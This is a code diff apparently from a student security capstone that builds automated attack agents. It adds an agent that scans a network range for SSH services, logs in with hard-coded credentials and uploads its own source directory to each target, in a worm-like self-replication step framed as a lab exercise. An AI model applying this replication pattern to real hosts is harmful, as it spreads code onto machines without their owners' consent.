@@ -125,6 +125,17 @@ if __name__ == "__main__":
                     "password": "1226"
                     }
 
+    replicateAgent = {"ip address": manualTargetIPAddress,
+                            "service": SSH,
+                            "port": 22,
+                            "action": "transferFile",
+                            "subaction":"uploadDirectory",
+                            "localDirectory": "/home/spiegel/Capstone-Project-2022/src",
+                            "remoteDirectory": "/home/spiegel",
+                            "fileName": "virus.txt",
+                            "username": "spiegel",
+                            "password": "1226"
+                            }
     # Randomly Grow tree to a depth of 3 if possible
     Tree = GeneticTree(ATTACKER, SERVICE)
     Tree.initialize(3, full=True)
@@ -155,17 +166,19 @@ if __name__ == "__main__":
     AgentAnderson.attackTargets(possibleTargets)
 
 
-
-
     # Agent Smith
     # Main goal: Fing Targets with open SSH services and upload itself to the remote system
     print("\n\nAgent Smith")
     AgentSmith = SimpleAgent("Anderson", reconContext)
     # We provide the range to scan on the network
     AgentSmith.recon("24")
-
-    # Get a list of computers running SSH services and are available
     possibleTargets = AgentSmith.filterForService(SSH)
-
+    print("Targets with Service: ", possibleTargets)
+    # Loginto SSH services and stetal the flags from a known location
+    AgentSmith.replaceContext(replicateAgent)
+    AgentSmith.generateTree(ATTACKER, SERVICE, 4)
+    # Uploading Agent Replication to target
+    print("Copy Agent To target")
+    AgentSmith.attackTargets(possibleTargets)
 
 
